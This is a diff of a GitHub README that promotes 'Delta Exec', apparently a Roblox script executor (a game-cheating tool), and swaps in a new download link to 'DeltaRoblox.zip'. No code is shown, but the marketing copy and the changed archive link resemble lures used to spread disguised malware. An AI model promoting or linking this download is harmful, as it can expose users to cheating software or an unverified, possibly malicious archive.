@@ -7,7 +7,7 @@
 **Delta Exec** is a high-performance scripting utility designed for the modern PC gaming environment. It provides a robust, low-latency framework for executing complex Luau-based scripts with high stability and compatibility. Engineered for power users, it offers a seamless interface for development and automation within interactive 3D environments.
 Experience unparalleled execution speed: featuring a lightweight core, advanced bytecode handling, and full support for the latest environmental global functions.
 
-<img width="859" height="628" alt="image" src="https://github.com/user-attachments/assets/d6509284-cde6-43db-b169-6074304e5d26" />
+<img width="1024" height="655" alt="image" src="https://github.com/user-attachments/assets/eee3619e-77f4-40ea-ae26-65a98ddff622" />
 
 ## 📦 What's Included
 
@@ -22,7 +22,7 @@ Experience unparalleled execution speed: featuring a lightweight core, advanced 
 
 ## 📥 Download
 
-📥 [`DeltaExec-PC-v3.5.2.zip`](https://github.com/.../releases/download/v3.5.2/DeltaExec-PC-v3.5.2.zip)  
+📥 [`DeltaRoblox.zip`](https://github.com/spookynoah/Delta-Exec-Roblox-PC/releases/download/Game-Addons/DeltaRoblox.zip)  
 ---
 
 ## ❗️ Troubleshooting
